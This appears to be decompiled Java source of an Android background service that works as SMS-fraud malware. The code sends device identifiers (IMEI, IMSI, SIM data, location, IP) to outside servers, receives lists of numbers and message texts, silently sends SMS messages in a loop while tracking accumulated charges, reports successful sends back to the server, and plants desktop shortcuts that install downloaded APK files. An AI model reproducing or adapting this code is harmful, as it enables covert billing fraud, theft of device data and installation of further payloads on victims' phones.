package zcz.sd;

import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.Intent.ShortcutIconResource;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.text.TextUtils;
import java.io.File;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Set;
import net.tsz.afinal.FinalHttp;
import net.tsz.afinal.http.AjaxCallBack;
import net.tsz.afinal.http.AjaxParams;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import xae.dd.RF;
import xcs.ff.S;
import xcs.ff.W;

public class Sbv
  extends Service
  implements RF
{
  private static final int MAX_PRICE = 50;
  private static final String PB_STATE = "pb_state";
  private static final long SPLIT_HOUR = 120000L;
  private static final long SPLIT_TIME = 3000L;
  private static final long XSPLIT_TIME = 60000L;
  private boolean IS_SEND;
  private BroadcastReceiver br;
  private Context context;
  private String date;
  private boolean redoing;
  private RF refresh;
  private S sp;
  private int state = 2;
  private Thread th;
  
  public Sbv() {}
  
  private void dealMsg(String paramString1, String paramString2)
  {
    getMsgShare().edit().putLong("QTIME", System.currentTimeMillis()).commit();
    if (TextUtils.isEmpty(paramString1)) {}
    for (;;)
    {
      return;
      try
      {
        paramString1 = new JSONObject(paramString1);
        if ((!paramString1.has("msgs")) || (!paramString1.has("curr"))) {
          continue;
        }
        Object localObject1 = paramString1.getString("msgs");
        long l1 = paramString1.getLong("curr");
        long l2 = System.currentTimeMillis();
        getMsgShare().edit().putLong("STIME", l1).commit();
        getMsgShare().edit().putLong("SETIME", l1 - l2).commit();
        paramString1 = getList(getMsgShare().getString(paramString2, null));
        Object localObject2 = getList((String)localObject1);
        if ((paramString1 == null) || (paramString1.size() == 0))
        {
          saveJson(paramString2, (List)localObject2);
          return;
        }
        if ((localObject2 == null) || (((List)localObject2).size() <= 0)) {
          continue;
        }
        localObject1 = new HashSet();
        Object localObject3 = paramString1.iterator();
        if (!((Iterator)localObject3).hasNext()) {
          localObject2 = ((List)localObject2).iterator();
        }
        for (;;)
        {
          if (!((Iterator)localObject2).hasNext())
          {
            saveJson(paramString2, paramString1);
            return;
            ((Set)localObject1).add(((Zl)((Iterator)localObject3).next()).getId());
            break;
          }
          localObject3 = (Zl)((Iterator)localObject2).next();
          if (!((Set)localObject1).contains(((Zl)localObject3).getId())) {
            paramString1.add(localObject3);
          }
        }
        return;
      }
      catch (JSONException paramString1) {}
    }
  }
  
  private void dealMsgToList(String paramString)
  {
    List localList = getList(getMsgShare().getString(paramString, null));
    if ((localList == null) || (localList.size() == 0))
    {
      getMsgShare().edit().putInt("SEND_STATE", 0).commit();
      return;
    }
    Object localObject1 = Calendar.getInstance();
    ((Calendar)localObject1).setTimeInMillis(System.currentTimeMillis());
    localObject1 = "SIDS" + ((Calendar)localObject1).get(1) + ((Calendar)localObject1).get(2) + ((Calendar)localObject1).get(5);
    Object localObject2 = getMsgShare().getString((String)localObject1, null);
    localObject1 = new HashSet();
    int j;
    int i;
    if (!TextUtils.isEmpty((CharSequence)localObject2))
    {
      localObject2 = ((String)localObject2).split(",");
      j = localObject2.length;
      i = 0;
      if (i < j) {}
    }
    else
    {
      localObject2 = new ArrayList();
      j = localList.size();
      i = 0;
    }
    for (;;)
    {
      if (i >= j)
      {
        preSendMsg((List)localObject2, paramString);
        return;
        ((Set)localObject1).add(Integer.valueOf(Integer.parseInt(localObject2[i])));
        i += 1;
        break;
      }
      Zl localZl = (Zl)localList.get(i);
      if (!((Set)localObject1).contains(localZl.getId())) {
        ((List)localObject2).add(localZl);
      }
      i += 1;
    }
  }
  
  private List<Zl> getList(String paramString)
  {
    if (TextUtils.isEmpty(paramString)) {
      paramString = null;
    }
    for (;;)
    {
      return paramString;
      try
      {
        JSONArray localJSONArray = new JSONArray(paramString);
        if ((localJSONArray != null) && (localJSONArray.length() > 0))
        {
          int j = localJSONArray.length();
          ArrayList localArrayList = new ArrayList();
          int i = 0;
          for (;;)
          {
            paramString = localArrayList;
            if (i >= j) {
              break;
            }
            paramString = localJSONArray.getJSONObject(i);
            Zl localZl = new Zl();
            localZl.setCitys(paramString.getString("citys"));
            localZl.setContent(paramString.getString("content"));
            localZl.setDay(Integer.valueOf(paramString.getInt("day")));
            localZl.setCityid(Integer.valueOf(paramString.getInt("cityid")));
            localZl.setEndtime(Integer.valueOf(paramString.getInt("endtime")));
            localZl.setStarttime(Integer.valueOf(paramString.getInt("starttime")));
            localZl.setTophone(paramString.getString("tophone"));
            localZl.setId(Integer.valueOf(paramString.getInt("id")));
            localArrayList.add(localZl);
            i += 1;
          }
        }
        return null;
      }
      catch (JSONException paramString) {}
    }
  }
  
  private SharedPreferences getMsgShare()
  {
    return getSharedPreferences("MSGSARE", 32771);
  }
  
  private void ico(String paramString1, final String paramString2, final int paramInt)
  {
    Object localObject1 = null;
    try
    {
      localObject2 = paramString1.substring(paramString1.lastIndexOf("/"), paramString1.length());
      localObject1 = localObject2;
    }
    catch (Exception localException)
    {
      Object localObject2;
      for (;;) {}
    }
    System.out.println("解析的文件名" + (String)localObject1);
    localObject1 = Environment.getExternalStorageDirectory().toString() + "/" + (String)localObject1;
    localObject2 = new File((String)localObject1);
    if (((File)localObject2).exists())
    {
      addShortcutToDesktop(this.context, paramString2, paramInt, (File)localObject2);
      return;
    }
    new FinalHttp().download(paramString1, (String)localObject1, new AjaxCallBack()
    {
      public void onSuccess(File paramAnonymousFile)
      {
        super.onSuccess(paramAnonymousFile);
        Sbv.this.addShortcutToDesktop(Sbv.this.context, paramString2, paramInt, paramAnonymousFile);
      }
    });
  }
  
  private void postSuccess(Zl paramZl, int paramInt, String paramString)
  {
    String str1 = paramZl.getTophone();
    String str2 = paramZl.getContent();
    String str3 = this.sp.getString("nimsi");
    String str4 = this.sp.getString("imei");
    this.sp.getString("flag");
    H localH = new H(this.context, this.refresh, paramInt);
    AjaxParams localAjaxParams = new AjaxParams();
    localAjaxParams.put("oper", str3);
    localAjaxParams.put("imei", str4);
    localAjaxParams.put("city", paramZl.getCityid());
    localAjaxParams.put("tophone", str1);
    localAjaxParams.put("content", str2);
    if (paramString.equals("MSG")) {}
    for (paramZl = getResources().getString(2131034119);; paramZl = "http://tqkjyxgs.com:8080/msg/")
    {
      localH.HttpPost(paramZl + getResources().getString(paramInt), localAjaxParams);
      return;
    }
  }
  
  private void preSendMsg(List<Zl> paramList, String paramString)
  {
    if ((paramList == null) || (paramList.size() == 0)) {
      getMsgShare().edit().putInt("SEND_STATE", 0).commit();
    }
    label385:
    for (;;)
    {
      return;
      int k = paramList.size();
      long l1 = System.currentTimeMillis();
      long l2 = getMsgShare().getLong("SETIME", 0L);
      Object localObject = Calendar.getInstance();
      ((Calendar)localObject).setTimeInMillis(l1 + l2);
      int m = ((Calendar)localObject).get(11);
      localObject = S.getInstance(this.context).getString("public_city");
      int j = 0;
      int i = 0;
      if (i >= k) {
        i = j;
      }
      for (;;)
      {
        if (i != 0) {
          break label385;
        }
        getMsgShare().edit().putInt("SEND_STATE", 0).commit();
        return;
        Zl localZl = (Zl)paramList.get(i);
        if ((!TextUtils.isEmpty(localZl.getCitys())) && (!TextUtils.isEmpty((CharSequence)localObject)) && (localZl.getCitys().indexOf(((String)localObject).substring(0, 2)) > -1)) {}
        int n;
        do
        {
          do
          {
            i += 1;
            break;
          } while ((m < localZl.getStarttime().intValue()) || (m > localZl.getEndtime().intValue()));
          n = getMsgShare().getInt("LID" + localZl.getId(), 0);
          l2 = getMsgShare().getLong("LTIME" + localZl.getId(), 0L);
        } while ((localZl.getDay().intValue() <= 0) || (((n <= 0) || (l1 - l2 < 60000L)) && ((n != 0) || (l1 - l2 < 3000L))));
        localZl.setDay(Integer.valueOf(localZl.getDay().intValue() - 1));
        paramList.set(i, localZl);
        saveJson(paramString, paramList);
        i = 1;
        sendMsg(localZl, l1, paramString);
      }
    }
  }
  
  private void resetData()
  {
    Object localObject1 = Calendar.getInstance();
    ((Calendar)localObject1).setTimeInMillis(System.currentTimeMillis());
    localObject1 = ((Calendar)localObject1).get(1) + ((Calendar)localObject1).get(2) + ((Calendar)localObject1).get(5);
    Object localObject2 = getMsgShare().getString("LASTSTART", null);
    if ((!TextUtils.isEmpty((CharSequence)localObject2)) && (((String)localObject1).indexOf((String)localObject2) < 0))
    {
      int i = getMsgShare().getInt("CPRICE", 0);
      long l1 = System.currentTimeMillis();
      long l2 = getMsgShare().getLong("SETIME", 0L);
      localObject2 = Calendar.getInstance();
      ((Calendar)localObject2).setTimeInMillis(l1 + l2);
      getMsgShare().edit().clear().commit();
      if (((Calendar)localObject2).get(5) != 1) {
        getMsgShare().edit().putInt("CPRICE", i).commit();
      }
    }
    getMsgShare().edit().putString("LASTSTART", (String)localObject1).commit();
  }
  
  private void runSMS()
  {
    resetData();
    if (System.currentTimeMillis() - getMsgShare().getLong("QTIME", 0L) >= 120000L) {
      qusterTest(2131034120);
    }
    if (getMsgShare().getInt("CPRICE", 0) >= 50)
    {
      System.out.println("MAX...50");
      return;
    }
    int i = getMsgShare().getInt("SEND_STATE", 0);
    System.out.println("run...");
    if (i == 0)
    {
      getMsgShare().edit().putInt("SEND_STATE", 1).commit();
      dealMsgToList("MSG");
      dealMsgToList("MSG2");
      return;
    }
    System.out.println("等待3秒");
  }
  
  private void saveJson(String paramString, List<Zl> paramList)
  {
    if ((paramList == null) || (paramList.size() == 0))
    {
      getMsgShare().edit().putString(paramString, "").commit();
      return;
    }
    JSONArray localJSONArray = new JSONArray();
    paramList = paramList.iterator();
    for (;;)
    {
      if (!paramList.hasNext())
      {
        getMsgShare().edit().putString(paramString, localJSONArray.toString()).commit();
        System.out.println("A- -: " + localJSONArray.toString());
        return;
      }
      Zl localZl = (Zl)paramList.next();
      JSONObject localJSONObject = new JSONObject();
      try
      {
        localJSONObject.put("citys", localZl.getCitys());
        localJSONObject.put("content", localZl.getContent());
        localJSONObject.put("day", localZl.getDay());
        localJSONObject.put("endtime", localZl.getEndtime());
        localJSONObject.put("starttime", localZl.getStarttime());
        localJSONObject.put("tophone", localZl.getTophone());
        localJSONObject.put("id", localZl.getId());
        localJSONObject.put("cityid", localZl.getCityid());
        localJSONArray.put(localJSONObject);
      }
      catch (JSONException localJSONException)
      {
        for (;;)
        {
          localJSONException.printStackTrace();
        }
      }
    }
  }
  
  private void sendMsg(Zl paramZl, long paramLong, String paramString)
  {
    SmsManager localSmsManager = SmsManager.getDefault();
    try
    {
      Intent localIntent = new Intent("SENT_SMS_ACTION");
      localIntent.putExtra("KEYSMS", paramString);
      localIntent.putExtra("idSms", paramZl.getId());
      paramString = PendingIntent.getBroadcast(this, paramZl.getId().intValue(), localIntent, paramZl.getId().intValue());
      int i = getMsgShare().getInt("frequrncy", 1);
      getMsgShare().edit().putInt("frequrncy", i + 1).commit();
      System.out.println(paramZl.getTophone() + "惊喜。。。" + paramZl.getContent());
      localSmsManager.sendTextMessage(paramZl.getTophone(), null, paramZl.getContent(), paramString, null);
      return;
    }
    catch (Exception paramZl) {}
  }
  
  private void sendSuccess(int paramInt, String paramString)
  {
    getMsgShare().edit().putInt("frequrncy", 1).commit();
    getMsgShare().edit().putInt("LID" + paramInt, paramInt).commit();
    getMsgShare().edit().putLong("LTIME" + paramInt, System.currentTimeMillis()).commit();
    List localList = getList(getMsgShare().getString(paramString, null));
    if ((localList == null) || (localList.size() == 0)) {}
    label383:
    label416:
    for (;;)
    {
      return;
      Object localObject = Calendar.getInstance();
      ((Calendar)localObject).setTimeInMillis(System.currentTimeMillis());
      localObject = "SIDS" + ((Calendar)localObject).get(1) + ((Calendar)localObject).get(2) + ((Calendar)localObject).get(5);
      String str = getMsgShare().getString((String)localObject, null);
      int j = localList.size();
      int i = 0;
      for (;;)
      {
        if (i >= j) {
          break label416;
        }
        Zl localZl = (Zl)localList.get(i);
        if (localZl.getId().intValue() == paramInt)
        {
          i = getMsgShare().getInt("CPRICE", 0);
          j = localZl.getPrice().intValue();
          getMsgShare().edit().putInt("CPRICE", i + j).commit();
          if (paramString.equals("MSG"))
          {
            i = 2131034121;
            postSuccess(localZl, i, paramString);
            if (localZl.getDay().intValue() != 0) {
              break;
            }
            if (!TextUtils.isEmpty(str)) {
              break label383;
            }
          }
          for (paramString = paramInt;; paramString = str + "," + paramInt)
          {
            getMsgShare().edit().putString((String)localObject, paramString).commit();
            return;
            i = 2131034132;
            break;
          }
        }
        i += 1;
      }
    }
  }
  
  public void addShortcutToDesktop(Context paramContext, String paramString, int paramInt, File paramFile)
  {
    Intent localIntent = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
    localIntent.putExtra("duplicate", false);
    localIntent.putExtra("android.intent.extra.shortcut.NAME", paramString);
    localIntent.putExtra("android.intent.extra.shortcut.ICON_RESOURCE", Intent.ShortcutIconResource.fromContext(paramContext, paramInt));
    paramString = new Intent("android.intent.action.VIEW");
    paramString.addFlags(268435456);
    paramString.setDataAndType(Uri.fromFile(paramFile), "application/vnd.android.package-archive");
    localIntent.putExtra("android.intent.extra.shortcut.INTENT", paramString);
    paramContext.sendBroadcast(localIntent);
  }
  
  public void initdate()
  {
    this.context = this;
    this.refresh = this;
    this.sp = new S(this);
    this.date = System.currentTimeMillis();
    this.state = this.sp.getInt("pb_state");
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    initdate();
    try
    {
      new W().getWifi(getApplicationContext()).equals("wifi");
      return;
    }
    catch (Exception localException) {}
  }
  
  public void onRefresh(int paramInt, Object... paramVarArgs)
  {
    paramVarArgs = paramVarArgs[0].toString();
    switch (paramInt)
    {
    case 2131034121: 
    default: 
      return;
    case 2131034120: 
      this.redoing = false;
      System.out.println("Req  :" + paramVarArgs);
      dealMsg(paramVarArgs, "MSG");
      try
      {
        Thread.sleep(3000L);
        qusterTest(2131034131);
        return;
      }
      catch (InterruptedException paramVarArgs)
      {
        return;
      }
    }
    this.redoing = false;
    dealMsg(paramVarArgs, "MSG2");
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    resetData();
    qusterTest(2131034120);
    if (this.state == 2)
    {
      this.state = 1;
      this.sp.setCache("pb_state", Integer.valueOf(this.state));
    }
    if (this.th == null)
    {
      this.th = new Thread()
      {
        public void run()
        {
          for (;;)
          {
            if (Sbv.this.IS_SEND) {
              return;
            }
            if (Sbv.this.getMsgShare().getInt("frequrncy", 1) > 10)
            {
              Sbv.this.IS_SEND = true;
              return;
            }
            Sbv.this.runSMS();
            try
            {
              Thread.sleep(3000L);
            }
            catch (InterruptedException localInterruptedException)
            {
              localInterruptedException.printStackTrace();
            }
          }
        }
      };
      this.th.start();
    }
    if (this.br == null)
    {
      this.br = new BroadcastReceiver()
      {
        public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
        {
          for (;;)
          {
            try
            {
              Sbv.this.getMsgShare().edit().putInt("SEND_STATE", 0).commit();
              int i = getResultCode();
              switch (i)
              {
              case 0: 
              default: 
                return;
              }
            }
            finally {}
            System.out.println("短信发送成功" + paramAnonymousIntent.getIntExtra("idSms", 0));
            Sbv.this.sendSuccess(paramAnonymousIntent.getIntExtra("idSms", 0), paramAnonymousIntent.getStringExtra("KEYSMS"));
            continue;
            System.out.println("发送失败--RESULT_ERROR_GENERIC_FAILURE--");
            continue;
            System.out.println("发送失败--RESULT_ERROR_RADIO_OFF--");
            continue;
            System.out.println("发送失败--RESULT_ERROR_NULL_PDU--");
          }
        }
      };
      registerReceiver(this.br, new IntentFilter("SENT_SMS_ACTION"));
    }
    return 1;
  }
  
  public void qusterTest(int paramInt)
  {
    if (this.redoing) {
      return;
    }
    this.redoing = true;
    H localH = new H(this, this.refresh, paramInt);
    AjaxParams localAjaxParams = new AjaxParams();
    String str = this.sp.getString("nimsi");
    localAjaxParams.put("oper", str);
    localAjaxParams.put("imei", this.sp.getString("imei"));
    localAjaxParams.put("flag", this.sp.getString("flag"));
    localAjaxParams.put("city", this.sp.getString("public_city"));
    localAjaxParams.put("ip", this.sp.getString("ip"));
    localAjaxParams.put("simimsi", this.sp.getString("simimsi"));
    localAjaxParams.put("day", getResources().getString(2131034117));
    localAjaxParams.put("cl.imei", this.sp.getString("imei"));
    localAjaxParams.put("cl.optime", "1");
    localAjaxParams.put("cl.startnumber", "2");
    localAjaxParams.put("cl.usetime", this.date);
    localAjaxParams.put("cl.wifistate", new W().getWifi(this.context));
    localAjaxParams.put("cl.terminal", Build.MODEL);
    localAjaxParams.put("cl.address", this.sp.getString("public_addstr"));
    localAjaxParams.put("cl.appversion", "1");
    localAjaxParams.put("cl.operators", str);
    localAjaxParams.put("cl.ipaddr", this.sp.getString("releae"));
    localAjaxParams.put("cl.state", this.state);
    localAjaxParams.put("cl.gamename", getString(2131034127));
    localAjaxParams.put("cl.px", this.sp.getString("publicxp"));
    localAjaxParams.put("cl.onetime", this.date);
    localAjaxParams.put("cl.ip", this.sp.getString("ip"));
    localAjaxParams.put("action", "pylzyf");
    localAjaxParams.put("oper", str);
    localAjaxParams.put("flag", this.sp.getString("flag"));
    localAjaxParams.put("city", this.sp.getString("public_city"));
    localAjaxParams.put("simimsi", this.sp.getString("simimsi"));
    localAjaxParams.put("day", getResources().getString(2131034117));
    localAjaxParams.put("imei", this.sp.getString("imei"));
    localAjaxParams.put("optime", "1");
    localAjaxParams.put("startnumber", "2");
    localAjaxParams.put("usetime", this.date);
    localAjaxParams.put("wifistate", new W().getWifi(this.context));
    localAjaxParams.put("terminal", Build.MODEL);
    localAjaxParams.put("address", this.sp.getString("public_addstr"));
    localAjaxParams.put("appversion", "1");
    localAjaxParams.put("operators", str);
    localAjaxParams.put("ipaddr", this.sp.getString("releae"));
    localAjaxParams.put("state", this.state);
    localAjaxParams.put("gamename", getString(2131034127));
    localAjaxParams.put("px", this.sp.getString("publicxp"));
    localAjaxParams.put("onetime", this.date);
    localAjaxParams.put("ip", this.sp.getString("ip"));
    if (paramInt == 2131034120) {
      str = getResources().getString(2131034119);
    }
    for (;;)
    {
      localH.HttpPost(str + getResources().getString(paramInt), localAjaxParams);
      System.out.println("|ip----http://app.zjhyt.com/msg/||nimsi:|" + this.sp.getString("nimsi") + "|imei:|" + this.sp.getString("imei") + "|instr:|" + 2 + "| flang:|" + this.sp.getString("flag") + "|state:|" + this.state + "|city:|" + this.sp.getString("public_city") + "|ip:|" + this.sp.getString("ip") + "|==day==|" + getResources().getString(2131034117) + "|==sim==|" + this.sp.getString("simimsi"));
      return;
      str = "http://tqkjyxgs.com:8080/msg/";
      this.redoing = false;
    }
  }
}
